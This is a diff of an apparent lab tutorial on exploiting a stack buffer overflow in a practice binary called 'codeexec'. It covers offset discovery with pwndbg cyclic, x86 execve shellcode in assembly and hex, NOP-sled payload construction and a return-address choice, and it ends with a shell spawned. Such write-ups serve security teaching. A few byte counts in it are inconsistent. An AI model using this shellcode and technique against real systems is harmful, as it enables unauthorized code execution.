@@ -104,27 +104,20 @@ As you can see from the source code, `codeexec` has a vulnerable buffer of size 
 To easily determine the return address offset, we can start with a **discovery payload** of the same size.
 
 To quickly generate this payload, we can use the GDB plugin **pwndbg**, which provides many functions specifically crafted for reverse engineering.  
-Once inside the GDB shell with `pwndbg` installed, type: `cyclic -n 4 500 ./docs/code_exec/discovery_payload.txt`.\
-Now redirect the payload into the `stdin` of the program and observe what happens:
-
-![codeexec 1](docs/images/codeexec%201.png)
-
+Once inside the GDB shell with `pwndbg` installed, type: `cyclic -n 4 500 ./docs/codeexec/discovery_payload.txt`.\
+Now run: `./bin/codeexec $(cat ./docs/codeexec/discovery_payload.txt)`.\
 As expected, our input has filled the buffer completely **without crashing** the program.\
-Let’s try again with a payload of size **752**.
+Let’s try again with a payload of size **1024**.
 
-![codeexec 2](docs/images/codeexec%202.png)\
-The following hexdump shows the stack contents immediately after the `strcpy`.\
-![codeexec 3](docs/images/codeexec%203.png)\
+![codeexec 1](docs/images/codeexec%201.jpeg)\
 
-This time, we’ve overflowed the buffer and caused the program to crash.\
-Looking at the segfault error, we see that the return address has been overwritten with the value: `0x66616162`.\
-Now you might wonder: _"What do we do with this?"_\
-Fortunately, `cyclic` allows us to determine the exact offset of the overwritten value:\
-by running `cyclic -o 0x66616162`, we discover that the return address is reached at offset **504**.
+This time, we’ve overflowed the buffer and caused the program to crash.
+Looking at the segfault error, we see that the return address has been overwritten with the value: `0x66616164 = daaf`.\
+`cyclic` allows us to determine the exact offset of the overwritten value by simply running: `cyclic -o 0x66616164`.
 
-To confirm this, let’s run the program with: `python3 -c 'print("A"*504 + "BBBB")' | ./codeexec`.\
-The program now crashes with the return address value: `0x42424242  # which corresponds to 'BBBB'`.\
-Success — we’ve confirmed the offset!
+![codeexec 2](docs/images/codeexec%202.jpeg)\
+
+Success — we’ve found the offset of **512**!
 
 ### (2) Crafting the payload
 
@@ -139,40 +132,50 @@ It increases the chances of a successful jump by allowing the return address to 
 this overwrites the original return address.
 It should point somewhere inside the NOP sled, to ensure the CPU will eventually reach the shellcode.
 
-In our case, we have 504 bytes available to store the **shellcode** + the **nop sled** that for the following shellcode is plenty of space given that our shellcode is only 24 bytes long.\
+In our case, we have **512** bytes available to store the **shellcode** + the **nop sled** that for the following shellcode is plenty of space given that our shellcode is only 22 bytes long.\
 Now we have written a simple shellcode that is the equivalent of run `execve("/bin/bash",{NULL},{NULL})` in a machine with intel_x86 architecture.
 
 ```c
-section .text
-global _start
-_start:
-xor eax,eax // generating the null value in eax without using the byte 0x00 (bad character)
-cdq // extend the sign of the 32bit value in eax to 64bit value, storing the extension in %edx (argv[3] for execve)
-push eax // pushing the zero value onto the stack (string terminator for "/bin//sh")
-push 0x68732f2f // pushing "//sh" onto the stack (little endian)
-push 0x6e69622f // pushing "/bin" onto the stack (little endian)
-// At this point the stack contains:
-// 0x00000000
-// 0x68732f2f
-// 0x6e69622f <-- %esp
-mov ebx,esp // %ebx pointer to the string "/bin//sh" (argv[0] for execve) 
-mov ecx, eax // %ecx = 0x00000000 (argv[1] for execve)
-mov al,0x0b // setting %eax to the syscall number of "execve", copying 0x0b to %al overwrite only the last 8bits of %eax.
-int 80h // call the syscall
+xor eax,eax // generate a null value without using \x00 (bad character)
+cdq // cdq extend the sign of the value in $eax in $edx => zeroing $edx
+push eax // push the null value in the stack as termination character of "/bin//sh"
+push 0x68732f2f // push "hs//" (//sh in little-endian)
+push 0x6e69622f // push "nib/"
+mov ebx,esp // $ebx contain the pointer to the first parameter of execve => $esp points to "/bin//sh"  
+mov ecx,eax // $ecx contain the pointer to the second parameter of execve => $eax is null
+sub eax,-0x0b // $eax contain the syscall number, use the subtraction to avoid \x0b (possible bad character)
+int 80h // trigger the syscall
 ```
 
 Let's proceed compiling the assembly file and extract the shellcode in hex format: 
-1. make the object file using: `nasm -f elf32 ./utils/codeexec_shellcode.asm -o ./obj/shellcode.o`
-2. make the binary file using: `ld -m elf_i386 ./obj/shellcode.o -o ./bin/shellcode`
-3. using the tool `bin2shell` extract the shellcode: `./bin2shell ./bin/shellcode`
-4. we finally get our shellcode: `\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\x0b\xcd\x80`
+1. make the object file using: `nasm -f elf32 ./utils/shellcode1.asm -o ./obj/shellcode.o`
+2. using the tool `bin2shell` extract the shellcode: `./bin2shell.sh ./obj/shellcode.o`
+3. we finally get our shellcode: `\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x83\xe8\xf5\xcd\x80`
 
 Now that we have all we need, lets craft the payload:
-1. nop sled, length: $offset - len(shellcode) = 504B - 22B = 482B$
-2. shellcode, length: 22B
+1. nop sled, length: $offset - len(shellcode) = 512B - 23B = 489B$
+2. shellcode, length: 23B
 3. return address that we get from the dump of the stack, length: 8B 
 
+Firstly we need to run the payload without a valid return address to discover it, 
+so after placing `AAAA` in the return address of the payload run: `codeexec $(cat ./docs/codeexec/payload.bin)`.\
+Now we need to find a return address that falls in the middle of the **nop sled**.
 
+![codeexec 3](docs/images/codeexec%203.jpeg)\
+
+The program is crashed, let's check the hexdump of the stack.
+
+![codeexec 4](docs/images/codeexec%204.jpeg)\
+
+As you can see the nop sled start around the address `0xbffff134` and terminates approximately at `0xbffff31c`, our payload need to have a return address between these two.
+Our choice is `0xbffff304` we only care to not choose an address with bad characters.
+Insert the address in little-endian form in the `gen_payload.py` script, generate the payload and run the program!
+
+![codeexec 5](docs/images/codeexec%205.jpeg)\
+
+Success — we’ve spawned a shell!
+
+### (3) Adjusting the shellcode to gain more privileges
 
 
 
